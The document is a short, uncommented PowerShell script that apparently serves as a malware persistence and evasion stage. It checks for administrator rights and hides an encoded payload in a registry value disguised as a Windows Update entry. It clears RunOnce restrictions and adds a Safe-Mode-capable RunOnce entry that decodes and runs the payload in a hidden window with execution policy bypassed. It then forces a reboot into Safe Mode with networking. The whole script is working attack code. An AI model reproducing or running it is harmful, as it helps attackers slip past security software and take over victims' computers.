if(!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(544)){Exit 1}
$B=""
$R="HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WindowsUpdate"
if(!(Test-Path $R)){New-Item -Path $R -Force|Out-Null}
Set-ItemProperty -Path $R -Name "InstallDate" -Value $B -Type String -EA "SilentlyContinue"
$G=@("HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer","HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
$G|ForEach-Object{if(Test-Path $_){Remove-ItemProperty -Path $_ -Name "DisableRunOnce" -EA "SilentlyContinue";Remove-ItemProperty -Path $_ -Name "DisableLocalMachineRunOnce" -EA "SilentlyContinue"}}
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "*x" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"`$P=(Get-ItemProperty '$R').InstallDate; `$M=New-Object IO.MemoryStream([Convert]::FromBase64String(`$P),0,`$P.Length); `$D=New-Object IO.Compression.DeflateStream(`$M,[IO.Compression.CompressionMode]::Decompress); `$S=New-Object IO.StreamReader(`$D); IEX `$S.ReadToEnd()`"" -EA "SilentlyContinue"
& bcdedit.exe /set "{current}" safeboot network|Out-Null
if($LASTEXITCODE -ne 0){Exit 1}
Restart-Computer -Force
